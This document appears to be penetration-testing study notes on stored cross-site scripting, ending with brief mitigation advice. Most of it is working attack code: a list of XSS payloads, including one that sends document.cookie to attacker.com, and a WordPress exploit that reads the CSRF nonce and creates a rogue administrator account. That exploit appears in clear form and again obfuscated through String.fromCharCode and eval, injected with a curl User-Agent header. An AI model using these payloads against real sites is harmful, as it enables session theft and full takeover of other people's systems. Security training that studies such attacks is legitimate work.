**Stored Cross‑Site Scripting (Stored XSS)**, also called **Persistent XSS**, occurs when a web application **stores malicious user input on the server** and later renders it in pages without proper sanitization or encoding.

The injected script becomes part of the application’s stored data and executes automatically when the page is loaded by users.

Since the payload is stored in the backend, every user visiting the affected page may trigger the script, which makes this vulnerability particularly dangerous.

---

## Identifying a Stored XSS

A common testing payload for verifying JavaScript execution:

```html
<script>alert(window.origin)</script>
```

> Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of `window.origin` in the alert box, instead of a static value like `1`. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.

---

## Alternative XSS Testing Payloads

Some environments restrict traditional alert dialogs, so testers often use alternative payloads to confirm injection.

```html
<script>alert(1)</script>
```

```html
<script>alert(document.cookie)</script>
```

```html
<script>print(1)</script>
```

```html
<plaintext>
```

```html
<img src=x onerror=alert(window.origin)>
```

```html
<svg onload=alert(window.origin)>
```

```html
<body onload=alert(window.origin)>
```

```html
<input autofocus onfocus=alert(window.origin)>
```

```html
<iframe src="javascript:alert(window.origin)">
```

```html
<details open ontoggle=alert(window.origin)>
```

```html
<script>confirm(window.origin)</script>
```

```html
<script>prompt(window.origin)</script>
```

```html
<script>
fetch("http://attacker.com/?cookie="+document.cookie)
</script>
```

---

## Confirming the Vulnerability is Persistent

To verify that the vulnerability is truly **stored on the backend**, the payload must remain after a page refresh.

Typical verification process:

- Inject the payload into a form
    
- Submit the form
    
- Reload the page
    

If the script executes again after refreshing the page, it confirms that the payload was **stored in the backend**.


---

## Stored XSS in WordPress Admin Panel – Example

This example shows a scenario where a vulnerable plugin stores user-controlled data (e.g., the **User-Agent**) and later renders it in the **admin dashboard without sanitization**.

When an administrator visits the page, the malicious script executes automatically (**Stored XSS**).

### How the attack works (XSS → CSRF bypass)

WordPress protects sensitive actions using a **nonce (CSRF token)**, so a direct malicious request would normally fail.

The XSS payload bypasses this by executing in the admin’s browser and:

1. Sends a request to `/wp-admin/user-new.php`
    
2. Extracts the nonce from the HTML response
    
3. Sends a POST request with the valid nonce to create a new administrator user
    

This way, the attacker bypasses CSRF protection because the request is made in the context of the authenticated admin.

### Payload (Unencoded – Clear Version)

```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "/wp-admin/user-new.php", false);
xhr.send();

var nonce = xhr.responseText.match(/_wpnonce" value="([^"]+)"/)[1];

var params = "action=createuser&_wpnonce_create-user=" + nonce +
"&user_login=attacker&email=attacker@offsec.com" +
"&pass1=attackerpass&pass2=attackerpass&role=administrator";

var xhr2 = new XMLHttpRequest();
xhr2.open("POST", "/wp-admin/user-new.php", true);
xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr2.send(params);
</script>
```

### Encoded Payload (Execution Version)

```bash
curl -i http://offsecwp \
--user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,59,97,46,111,112,101,110,40,39,71,69,84,39,44,39,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,39,44,102,97,108,115,101,41,59,97,46,115,101,110,100,40,41,59,118,97,114,32,110,61,97,46,114,101,115,112,111,110,115,101,84,101,120,116,46,109,97,116,99,104,40,47,95,119,112,110,111,110,99,101,34,32,118,97,108,117,101,61,34,40,91,94,34,93,43,41,34,47,41,91,49,93,59,118,97,114,32,112,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,97,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,59,97,46,111,112,101,110,40,39,80,79,83,84,39,44,39,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,39,116,114,117,101,41,59,97,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,39,67,111,110,116,101,110,116,45,84,121,112,101,39,44,39,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,39,41,59,97,46,115,101,110,100,40,112,41,59))</script>"
```

---

## Mitigation

Preventing Stored XSS requires proper handling of user input and safe output rendering.

Key defensive practices include:

- Validate and restrict input data
    
- Encode user content before rendering it in HTML
    
- Avoid inserting raw user input into scripts or HTML attributes
    
- Implement Content Security Policy (CSP) headers
    
- Use templating frameworks that automatically escape output
    

Example CSP header:

```http
Content-Security-Policy: default-src 'self'
```

CSP reduces the impact of XSS by restricting where scripts can be loaded from.
